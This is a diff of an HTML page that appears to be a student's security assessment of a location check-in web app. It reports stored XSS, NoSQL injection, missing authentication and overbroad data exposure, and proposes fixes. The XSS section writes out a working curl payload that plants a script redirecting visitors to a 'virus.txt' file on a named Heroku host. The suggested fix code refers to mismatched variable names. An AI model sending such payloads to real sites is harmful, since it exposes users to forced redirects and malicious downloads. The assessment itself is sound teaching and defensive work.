@@ -1,5 +1,5 @@
 <!doctype html>
-<html>
+<html lang="en">
 
 <head>
 <title>Assignment 4</title>
@@ -29,7 +29,7 @@
 	<li>Location of issue: Parsing post parameters sent to server (index.js line 90)</li>
 	<li>Severity of issue: High. May lead to issues such as downloading unwanted viral content, as shown below</li>
 	<li>Description of issue: The string login parameter stored in the database isn't parsed before being stored in the database, allowing for html script injections. For example, when I send the following to the server:
-		<p><pre>curl --data "login=&lt;script&gt; document.location.href = 'https://raw.githubusercontent.com/tuftsdev/comp20-jyang/master/security/examples/virus.txt?token=Ac8Ju3YoSwLSPnt2T127XWdADCoewghzks5aNFSdwA%3D%3D'; &lt;/script&gt;&amp;lat=0&amp;lng=0" https://stark-journey-75501.herokuapp.com/sendLocation</pre></p>
+		<pre>curl --data "login=&lt;script&gt; document.location.href = 'https://raw.githubusercontent.com/tuftsdev/comp20-jyang/master/security/examples/virus.txt?token=Ac8Ju3YoSwLSPnt2T127XWdADCoewghzks5aNFSdwA%3D%3D'; &lt;/script&gt;&amp;lat=0&amp;lng=0" https://stark-journey-75501.herokuapp.com/sendLocation</pre>
 	accessing <a href="https://stark-journey-75501.herokuapp.com/">https://stark-journey-75501.herokuapp.com/</a> will cause an automatic redirect to opening the file "virus.txt" in the browser. If the file was a .exe file instead, or any file that's automatically downloaded if it can't be opened in a browser window, serious harm could be caused.
 	</li>
 	<li>Proof of vulnerability:
@@ -39,50 +39,51 @@
 		<p>The application (server) home page after redirecting to opening the harmful file due to login script</p>
 	</li>
 	<li>Resolution: This issue can be alleviated by removing all special characters from the string login input by replacing index.js line 90 with:
-		<p><pre>var login = request.body.login.replace(/[^\w\s]/gi, '');</pre></p>
+		<pre>var login = request.body.login.replace(/[^\w\s]/gi, '');</pre>
 	Another solution that preserves the special characters is to html encode the string login input before storing in the database, which can be done with the npm htmlencode package detailed <a href="https://www.npmjs.com/package/htmlencode">here</a>.</li>
 	</ul>
+	<br>
 </li>
-<br>
 <li>Issue: Injection
 	<ul>
 	<li>Location of issue: Finding entries that match the login GET parameter to /checkins.json (index.js line 69)</li>
 	<li>Severity of issue: Low, only because the application already allows access to all the login entries elsewhere in the app</li>
 	<li>Description of issue: The login parameter is directly entered as a search query to the mongodb database. Thus, query operators such as the "not equal" ($ne) operator may be entered and applied so checkins.json returns all the entries not equal to the search query rather than only searching for the query as intended.
 		<p>With the way the app is set up now, the issue does not have much impact, since all the login entries are returned anyway at the '/' homepage. However, it is still important to remove the user's ability to access data on other users to which they should not be privy, in case the app is further developed in a way that information on all users is no longer willingly released.</p></li>
-	<li>Proof of vulnerability:</li>
+	<li>Proof of vulnerability:
 		<p><img src="examples/injection-noops.png" alt="checkins.json search results for query 'jingqi' without operators returns nothing" /></p>
 		<p>Fake login 'jingqi' should not return any checkins</p>
 		<p><img src="examples/injection-ops.png" alt="checkins.json search results for query 'jingqi' with not equal operator returns all login entries in database" /></p>
 		<p>Even with the fake login, an injection attack can be made to get all checkins in the database</p>
+	</li>
 	<li>Resolution: Instead of directory passing the query from the GET request to the find function, each entry's login in the database should be compared to the GET request query so no operators will be called. For example, changing index.js lines 69-75 to:
-		<p><pre>
+		<pre>
 		<br>coll.find().toArray(function (err, checkins) {
 		<br>    if (!err) {
 		<br>    var userlogins = [];
-		<br>    for (var i = 0; i < results.length; i++)
+		<br>    for (var i = 0; i &lt; results.length; i++)
 		<br>        if (login == checkins[i].login)
 		<br>            userlogins.push(checkins[i]);
 		<br>    res.send(logins);
-		</pre></p>
+		</pre>
 	</li>
 	</ul>
 </li>
-<br>
 <li>Issue: Cross-site request forgery
 	<ul>
 	<li>Location of issue: Where the login is entered to access data from the application (index.js lines 67, 96)</li>
 	<li>Severity of issue: Low, only because the application already allows access to all the login entries elsewhere in the app</li>
 	<li>Description of issue: Though every front-end client was given a specific username to protect user privacy, the validity of this login username is never verified (there is no sign-in process with the login username). Literally anyone who knows the application url and specified parameters can request data on any login in the system.</li>
-	<li>Proof of vulnerability:</li>
+	<li>Proof of vulnerability:
 		<p><img src="examples/forgery-map.png" alt="fake mchowgrading checkin near me on the google map" /></p>
 		<p>I can alter my login on the client side and make it appear as if mchowgrading logged in near me</p>
 		<p><img src="examples/forgery-search.png" alt="checkins.json search results for query 'mchowgrading'" /></p>
 		<p>I am not mchowgrading, yet I can still see all of mchowgrading's previous checkins</p>
+	</li>
 	<li>Resolution: If a user is to use the server, they should be required to make an account or in some way authenicate that they are exactly that user.</li>
 	</ul>
+	<br>
 </li>
-<br>
 <li>
 	<ul>
 	<li>Issue: Poor programming practice
@@ -91,9 +92,10 @@
 	<li>Severity of issue: Low-medium, because the app allows access to data that's supposed to be inaccessible, but the data itself does not contain sensitive information</li>
 	<li>Description of issue: Even though only the landmarks within a 1 mile radius of the user are intended to be shown, all of the landmarks in the database are returned and displayed on the map.
 		<p>With the way the app is set up now, the issue does not have much impact, due to the landmarks data being publicly accessible and impersonal anyway. However, if the client is only supposed to have access to certain information, showing other information is bad practice and could be harmful with more sensitive data.</p></li>
-	<li>Proof of vulnerability:</li>
+	<li>Proof of vulnerability:
 		<p><img src="examples/incorrect-map.png" alt="map of user and all surrounding landmarks" /></p>
 		<p>Landmarks from outside the 1 mile radius are displayed on the map</p>
+	</li>
 	<li>Resolution: Instead of finding all landmarks in the database, the 2d sphere index function needs to be used, so only the ones within a 1 mile radius of the user's coordinates and found.</li>
 	</ul>
 </li>
